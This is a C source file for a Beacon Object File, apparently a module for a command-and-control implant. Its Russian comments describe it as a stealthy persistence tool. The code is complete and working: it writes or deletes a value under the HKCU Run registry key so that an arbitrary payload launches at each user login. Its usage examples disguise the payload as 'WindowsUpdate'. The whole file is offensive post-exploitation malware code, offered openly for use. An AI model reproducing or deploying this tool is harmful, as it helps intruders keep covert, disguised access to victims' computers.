// bof_persistence_run.c — создание persistence через registry Run key.
//
// Добавляет запись в HKCU\Software\Microsoft\Windows\CurrentVersion\Run
// для автозапуска payload'а при логине пользователя. Более скрытная
// альтернатива schtasks - не создает видимых задач в Task Scheduler.

#include "bof_api.h"

DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegSetValueExA(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE* lpData, DWORD cbData);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegDeleteValueA(HKEY hKey, LPCSTR lpValueName);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegCloseKey(HKEY hKey);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize);

#define HKEY_CURRENT_USER   ((HKEY)(ULONG_PTR)((LONG)0x80000001))
#define KEY_SET_VALUE       0x0002
#define REG_SZ              1

void go(char* args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    int len;
    char* action = BeaconDataExtract(&parser, &len);
    if (!action) {
        BeaconPrintf(CALLBACK_OUTPUT, "Usage: bof bof_persistence_run.x64.o <install|remove> [name] [path]\n");
        BeaconPrintf(CALLBACK_OUTPUT, "Examples:\n");
        BeaconPrintf(CALLBACK_OUTPUT, "  bof bof_persistence_run.x64.o install WindowsUpdate C:\\temp\\update.exe\n");
        BeaconPrintf(CALLBACK_OUTPUT, "  bof bof_persistence_run.x64.o remove WindowsUpdate\n");
        return;
    }

    HKEY run_key;
    LONG result = ADVAPI32$RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_SET_VALUE,
        &run_key
    );

    if (result != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[persistence] Failed to open Run registry key: %d\n", result);
        return;
    }

    // Simple string comparison
    int is_install = 1;
    if (len >= 6) {
        char* p = action;
        if (p[0] == 'r' && p[1] == 'e' && p[2] == 'm' && p[3] == 'o' && p[4] == 'v' && p[5] == 'e') {
            is_install = 0;
        }
    }

    if (is_install) {
        char* name = BeaconDataExtract(&parser, &len);
        char* path = BeaconDataExtract(&parser, &len);

        if (!name || !path) {
            BeaconPrintf(CALLBACK_ERROR, "[persistence] Install requires name and path\n");
            ADVAPI32$RegCloseKey(run_key);
            return;
        }

        // Null-terminate strings
        char name_buf[128] = {0};
        char path_buf[512] = {0};

        for (int i = 0; i < len && i < 127 && name[i]; i++) {
            name_buf[i] = name[i];
        }

        len = 0;
        for (int i = 0; i < 511 && path[i]; i++) {
            path_buf[i] = path[i];
            len = i + 1;
        }

        result = ADVAPI32$RegSetValueExA(
            run_key,
            name_buf,
            0,
            REG_SZ,
            (BYTE*)path_buf,
            len + 1
        );

        if (result == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "[persistence] Installed: %s -> %s\n", name_buf, path_buf);
            BeaconPrintf(CALLBACK_OUTPUT, "[persistence] Will run at next user login\n");
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[persistence] Failed to set registry value: %d\n", result);
        }
    } else {
        // Remove
        char* name = BeaconDataExtract(&parser, &len);
        if (!name) {
            BeaconPrintf(CALLBACK_ERROR, "[persistence] Remove requires name\n");
            ADVAPI32$RegCloseKey(run_key);
            return;
        }

        char name_buf[128] = {0};
        for (int i = 0; i < len && i < 127 && name[i]; i++) {
            name_buf[i] = name[i];
        }

        result = ADVAPI32$RegDeleteValueA(run_key, name_buf);
        if (result == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "[persistence] Removed: %s\n", name_buf);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[persistence] Failed to remove registry value: %d\n", result);
        }
    }

    ADVAPI32$RegCloseKey(run_key);
}